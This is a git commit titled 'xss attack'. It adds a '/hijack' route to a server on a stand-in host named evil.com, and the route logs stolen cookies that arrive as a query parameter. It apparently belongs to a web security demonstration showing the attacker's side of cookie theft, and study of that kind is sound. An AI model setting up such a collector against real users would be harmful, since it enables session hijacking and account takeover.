d4e9e1a96a1f188843df220a0b03e06ad3960030
Mike Sherov <mike.sherov@gmail.com>
2019-10-07 16:04:25 -0400

    xss attack

--- evil.com/index.js
+++ evil.com/index.js
@@ -4,4 +4,10 @@ const app = localHost("evil.com");
 
 app.use(express.static(__dirname + "/static"));
 
+app.route("/hijack").get((request, response) => {
+  console.log("received cookie", request.query.payload);
+  response.status(200);
+  response.send("ok");
+});
+
 app.listen(666);
